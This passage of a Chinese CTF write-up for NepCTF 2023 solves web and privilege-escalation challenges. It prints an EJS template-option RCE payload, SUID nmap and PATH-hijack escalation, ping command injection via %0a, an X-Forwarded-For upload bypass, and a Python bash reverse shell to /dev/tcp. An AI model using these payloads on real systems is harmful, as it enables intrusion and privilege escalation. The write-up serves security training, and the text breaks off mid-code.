class="hljs-keyword">page</span>?pageid=符合格式的id<span class="hljs-variable">&amp;name</span>=1<span class="hljs-variable">&amp;address</span>=1<span class="hljs-variable">&amp;message</span>=asdasd<span class="hljs-variable">&amp;settings</span>[<span class="hljs-keyword">view</span> <span class="hljs-keyword">options</span>][escapeFunction]=console.log;this.global.process.mainModule.require(<span class="hljs-string">&#x27;child_process&#x27;</span>).execSync(<span class="hljs-string">&#x27;反弹shell&#x27;</span>);<span class="hljs-variable">&amp;settings</span>[<span class="hljs-keyword">view</span> <span class="hljs-keyword">options</span>][client]=true<br></code></pre></td></tr></table></figure><h3 id="独步天下-转生成为镜花水月中的王者"><a href="#独步天下-转生成为镜花水月中的王者" class="headerlink" title="独步天下-转生成为镜花水月中的王者"></a>独步天下-转生成为镜花水月中的王者</h3><h4 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h4><p>大佬把nmap给dump下来分析</p><p><img src="/2023/08/31/NepCTF2023/image.png"></p><p>root权限命令执行</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">payload:</span> nmap <span class="hljs-string">&quot;asd;sh&quot;</span><br></code></pre></td></tr></table></figure><h4 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h4><p>题目提示环境变量提权</p><p>先找拥有suid权限的</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">find</span> <span class="hljs-regexp">/ -user root -perm -4000 -print 2&gt;/</span>dev/<span class="hljs-keyword">null</span><br><br><span class="hljs-keyword">find</span> <span class="hljs-regexp">/ -perm -u=s -type f 2&gt;/</span>dev/<span class="hljs-keyword">null</span><br><br>#操作时&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span>会报错<br></code></pre></td></tr></table></figure><p>只有nmap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /tmp<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/sh&quot;</span> &gt; ports-alive   <br><span class="hljs-built_in">chmod</span> 777 ports-alive<br><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br>nmap 127.0.0.1<br><br></code></pre></td></tr></table></figure><p>一定要是<code>ports-alive</code>文件，因为<code>nmap</code>执行时会报错<code>ports-alive：not found</code>（就是这里被坑了）</p><p>nmap会调用<code>ports-alive</code>文件</p><h3 id="独步天下-破除虚妄-探见真实"><a href="#独步天下-破除虚妄-探见真实" class="headerlink" title="独步天下-破除虚妄_探见真实"></a>独步天下-破除虚妄_探见真实</h3><p>该类题为内网题目，需要使用内网工具进行内网探测  （这里无环境复现，也没有实际尝试过，也不会尝试，所以探测过程就不写了 ，下次一定）</p><p>运行<code>ports-alive</code>(题目中存在的端口探测脚本)</p><p><code>ports-alive not found</code> 是因为使用的是<code>sh</code>而<code>ports-alive</code>中是<code>#!/bin/bash</code>，把该标注修改为<code>#!/bin/sh</code> （那上面的nmap就不知道什么原因了）</p><p><code>./ports-alive 192.168.200.1 0 100</code></p><p>发现80和82端口</p><p>打开82端口</p><p><img src="/2023/08/31/NepCTF2023/web1.png"></p><p>两处很明显能利用的地方</p><p>先尝试ping命令执行， <code>; &amp;&amp; || %0a</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ip_address</span>=<span class="hljs-number">127.0.0.1</span>%<span class="hljs-number">0</span>als -l /<br></code></pre></td></tr></table></figure><p>flag什么权限都没有 （用户为mysql）              flag_mini什么权限也没有(用户为ctf)</p><p>第二关是读取flag_mini</p><p>大佬说尝试反弹shell回来，但这里做了一些过滤（官方说ban了chmod）</p><p>我猜测bash什么的应该是被禁用了，不然应该能直接bash反弹shell</p><p>然后想起文件上传</p><p>读取app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request, url_for, redirect<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> ctypes<br><span class="hljs-keyword">import</span> ctypes.util<br><span class="hljs-keyword">import</span> time<br>os.environ[<span class="hljs-string">&#x27;FLASK_ENV&#x27;</span>] = <span class="hljs-string">&#x27;production&#x27;</span><br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="hljs-string">&#x27;./&#x27;</span><br><br>lib_name=<span class="hljs-string">&#x27;./libping.so&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_ping_library</span>():<br>    <span class="hljs-comment"># 加载共享库</span><br>    mylib = ctypes.CDLL(lib_name)<br>    <span class="hljs-keyword">return</span> mylib<br><br>mylib = load_ping_library()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/ping&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ping</span>():<br>    <span class="hljs-keyword">global</span> mylib<br>    ip_address = request.form[<span class="hljs-string">&#x27;ip_address&#x27;</span>]<br>    result = ctypes.create_string_buffer(<span class="hljs-number">4096</span>*<span class="hljs-number">2</span>)<br>    mylib.ping(ip_address.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>), result)<br>    <span class="hljs-keyword">return</span> result.value.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload_avatar&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_avatar</span>():<br>    <span class="hljs-keyword">if</span> request.headers.get(<span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>) != <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;You are not allowed to upload files from this IP address.&quot;</span> + <span class="hljs-string">&quot; Your IP is: &quot;</span> + request.headers.get(<span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;file&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> request.files:<br>        <span class="hljs-keyword">return</span> redirect(request.url)<br>    file = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br>    <span class="hljs-keyword">if</span> file.filename == <span class="hljs-string">&#x27;&#x27;</span>:<br>        <span class="hljs-keyword">return</span> redirect(request.url)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> allowed_file(file.filename):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid file format. Only PNG files are allowed.&#x27;</span><br>    <span class="hljs-comment"># 限制文件大小为 5KB</span><br>    MAX_FILE_SIZE = <span class="hljs-number">5</span> * <span class="hljs-number">1024</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(file.read()) &gt; MAX_FILE_SIZE:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;File too large. Maximum size is 5KB.&#x27;</span><br>    <span class="hljs-comment"># 将文件保存到服务器</span><br>    file.seek(<span class="hljs-number">0</span>)  <span class="hljs-comment"># 重置文件读取指针</span><br>    file.save(os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], <span class="hljs-string">&#x27;avatar.png&#x27;</span>))<br>    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">allowed_file</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;.&#x27;</span> <span class="hljs-keyword">in</span> filename <span class="hljs-keyword">and</span> filename.rsplit(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)[<span class="hljs-number">1</span>].lower() == <span class="hljs-string">&#x27;png&#x27;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">82</span>,debug=<span class="hljs-literal">False</span>,use_reloader=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><p>看到文件上传的路由，审计一下</p><p>要求<code>X-Forwarded-For</code>请求头为<code>127.0.0.1</code>，限定文件后缀为png，上传的png文件最后命名为<code>avatar.png</code></p><p>因为要反弹shell，（可以用python，也可以用C语言）</p><p>上传png文件内容为</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lua">import <span class="hljs-built_in">os</span><br><span class="hljs-built_in">os</span>.<span class="hljs-built_in">popen</span>(<span class="hljs-string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;</span>).<span class="hljs-built_in">read</span>()<br></code></pre></td></tr></table></figure><p><code>python3 avatar.png</code>执行文件，成功反弹shell</p><hr><p>这里之后的内容都不理解</p><p>需要做的是提权，看一下ps -ef有什么可疑进程</p><p><img src="/2023/08/31/NepCTF2023/web2.png"></p><p>查看identity源码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/seccomp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;openssl/md5.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/resource.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;net/if.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-comment">//gcc -o test1 test1.c -lcrypto -lm -lrt</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init_dir</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> fd=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/home/ctf/sandbox/&quot;</span>,O_RDONLY);<br>    <span class="hljs-keyword">if</span>(fd&lt;<span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    MD5_CTX ctx;<br>    <span class="hljs-type">char</span> md5_res[<span class="hljs-number">17</span>]=<span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-type">char</span> key[<span class="hljs-number">100</span>]=<span class="hljs-string">&quot;NEPCTF_6666&quot;</span>;<br>    <span class="hljs-type">char</span> sandbox_dir[<span class="hljs-number">100</span>]=<span class="hljs-string">&quot;/home/ctf/sandbox/&quot;</span>;<br>    <span class="hljs-type">char</span> dir_name[<span class="hljs-number">100</span>]=<span class="hljs-string">&quot;/home/ctf/sandbox/&quot;</span>;<br>    FILE *new_pip;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-built_in">setbuf</span>(stdin, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">setbuf</span>(stdout, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">setbuf</span>(stderr, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">rlimit</span> r;<br>    r.rlim_max = r.rlim_cur = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">setrlimit</span>(RLIMIT_CORE, &amp;r);<br>    <span class="hljs-built_in">memset</span>(key, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(key));<br>    <span class="hljs-built_in">MD5_Init</span>(&amp;ctx);<br>    <span class="hljs-built_in">MD5_Update</span>(&amp;ctx, key, <span class="hljs-built_in">strlen</span>(key));<br>    <span class="hljs-built_in">MD5_Final</span>(md5_res, &amp;ctx);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++)<br>            <span class="hljs-built_in">sprintf</span>(&amp;(dir_name[i*<span class="hljs-number">2</span> + <span class="hljs-number">18</span>]), <span class="hljs-string">&quot;%02hhx&quot;</span>, md5_res[i]&amp;<span class="hljs-number">0xff</span>);<br>    <span class="hljs-type">char</span> cmd[<span class="hljs-number">100</span>];<br><br>    <span class="hljs-built_in">mkdir</span>(dir_name, <span class="hljs-number">0755</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">chdir</span>(dir_name)==<span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;chdir err, exiting\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-built_in">sprintf</span>(cmd,<span class="hljs-string">&quot;%s%s&quot;</span>,<span class="hljs-string">&quot;chmod 777 &quot;</span>,dir_name);<br>    <span class="hljs-built_in">system</span>(cmd);<br>    <span class="hljs-built_in">mkdir</span>(<span class="hljs-string">&quot;bin&quot;</span>, <span class="hljs-number">0777</span>);<br>    <span class="hljs-built_in">mkdir</span>(<span class="hljs-string">&quot;lib&quot;</span>, <span class="hljs-number">0777</span>);<br>    <span class="hljs-built_in">mkdir</span>(<span class="hljs-string">&quot;lib64&quot;</span>, <span class="hljs-number">0777</span>);<br>    <span class="hljs-built_in">mkdir</span>(<span class="hljs-string">&quot;lib/x86_64-linux-gnu&quot;</span>, <span class="hljs-number">0777</span>);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;cp /bin/bash bin/sh&quot;</span>);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;cp /lib/x86_64-linux-gnu/libdl.so.2 lib/x86_64-linux-gnu/&quot;</span>);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;cp /lib/x86_64-linux-gnu/libc.so.6 lib/x86_64-linux-gnu/&quot;</span>);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;cp /lib/x86_64-linux-gnu/libtinfo.so.5 lib/x86_64-linux-gnu/&quot;</span>);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;cp /lib64/ld-linux-x86-64.so.2 lib64/&quot;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">chroot</span>(<span class="hljs-string">&quot;.&quot;</span>) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;chroot err, exiting\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">command</span><span class="hljs-params">(<span class="hljs-type">int</span> server_socket,<span class="hljs-type">int</span> client_socket)</span> </span>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x666</span>];<br>    <span class="hljs-built_in">memset</span>(buf,<span class="hljs-number">0</span>,<span class="hljs-number">0x666</span>);<br>    <span class="hljs-built_in">write</span>(client_socket,<span class="hljs-string">&quot;Tmp-Command:&quot;</span>,<span class="hljs-built_in">sizeof</span>(<span class="hljs-string">&quot;Tmp-Command:&quot;</span>));<br>    <span class="hljs-built_in">read</span>(client_socket, buf, <span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">setgid</span>(<span class="hljs-number">1001</span>);<br>    <span class="hljs-built_in">setuid</span>(<span class="hljs-number">1001</span>);<br>    <span class="hljs-built_in">popen</span>(buf,<span class="hljs-string">&quot;w&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">get_ip_address</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *interface_name, <span class="hljs-type">char</span> *ip_address)</span> </span>&#123;<br>    <span class="hljs-type">int</span> sockfd;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">ifreq</span> ifr;<br>    <span class="hljs-comment">// Create a socket</span><br>    sockfd = <span class="hljs-built_in">socket</span>(AF_INET, SOCK_DGRAM, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (sockfd &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;Socket creation failed&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-comment">// Set the interface name in the ifreq structure</span><br>    <span class="hljs-built_in">strncpy</span>(ifr.ifr_name, interface_name, IFNAMSIZ - <span class="hljs-number">1</span>);<br>    ifr.ifr_name[IFNAMSIZ - <span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    <span class="hljs-comment">// Get the IP address using the SIOCGIFADDR ioctl request</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ioctl</span>(sockfd, SIOCGIFADDR, &amp;ifr) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;ioctl failed&quot;</span>);<br>        <span class="hljs-built_in">close</span>(sockfd);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">close</span>(sockfd);<br>    <span class="hljs-comment">// Convert the binary IP address to a human-readable string</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">sockaddr_in</span> *addr = (<span class="hljs-keyword">struct</span> sockaddr_in *)&amp;ifr.ifr_addr;<br>    <span class="hljs-built_in">strcpy</span>(ip_address, <span class="hljs-built_in">inet_ntoa</span>(addr-&gt;sin_addr));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span> </span>&#123;<br>    <span class="hljs-built_in">init_dir</span>();<br>    <span class="hljs-type">int</span> flag=<span class="hljs-number">1</span>;<br>    <span class="hljs-comment">// Server setup</span><br>    <span class="hljs-type">int</span> server_socket, client_socket;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">sockaddr_in</span> server_addr, client_addr;<br>    <span class="hljs-type">socklen_t</span> client_len = <span class="hljs-built_in">sizeof</span>(client_addr);<br>    <span class="hljs-comment">// Create socket</span><br>    server_socket = <span class="hljs-built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (server_socket &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;Socket creation failed&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-comment">// Set up server address</span><br>    <span class="hljs-built_in">memset</span>(&amp;server_addr, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(server_addr));<br>    server_addr.sin_family = AF_INET;<br>    server_addr.sin_addr.s_addr = INADDR_ANY;<br>    server_addr.sin_port = <span class="hljs-built_in">htons</span>(<span class="hljs-number">9999</span>);<br>    <span class="hljs-comment">// Bind socket to address and port</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">bind</span>(server_socket, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;server_addr, <span class="hljs-built_in">sizeof</span>(server_addr)) &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;Bind failed&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-comment">// Listen for incoming connections</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">listen</span>(server_socket, <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;Listen failed&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Server is listening on port 9999...\n&quot;</span>);<br>    <span class="hljs-comment">// Accept connection from client</span><br>    client_socket = <span class="hljs-built_in">accept</span>(server_socket, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;client_addr, &amp;client_len);<br>    <span class="hljs-keyword">if</span> (client_socket &lt; <span class="hljs-number">0</span>) &#123;<br>        client_socket = <span class="hljs-built_in">accept</span>(server_socket, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;client_addr, &amp;client_len);<br>    &#125;<br>    <span class="hljs-type">char</span> client_ip[INET_ADDRSTRLEN];<br>    <span class="hljs-built_in">inet_ntop</span>(AF_INET, &amp;client_addr.sin_addr, client_ip, INET_ADDRSTRLEN);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Client connected from IP: %s\n&quot;</span>, client_ip);<br>    <span class="hljs-type">char</span> ip_address[INET_ADDRSTRLEN];<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *interface_name = <span class="hljs-string">&quot;eth0&quot;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">get_ip_address</span>(interface_name, ip_address) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;IP address of eth0: %s\n&quot;</span>, ip_address);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Failed to get the IP address of eth0.\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">while</span>(flag) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(client_ip,ip_address)) &#123;<br>            <span class="hljs-built_in">send</span>(client_socket,<span class="hljs-string">&quot;Only nc by localhost!\n&quot;</span>,<span class="hljs-built_in">sizeof</span>(<span class="hljs-string">&quot;Only nc by localhost!\n&quot;</span>),<span class="hljs-number">0</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125; <span class="hljs-keyword">else</span> 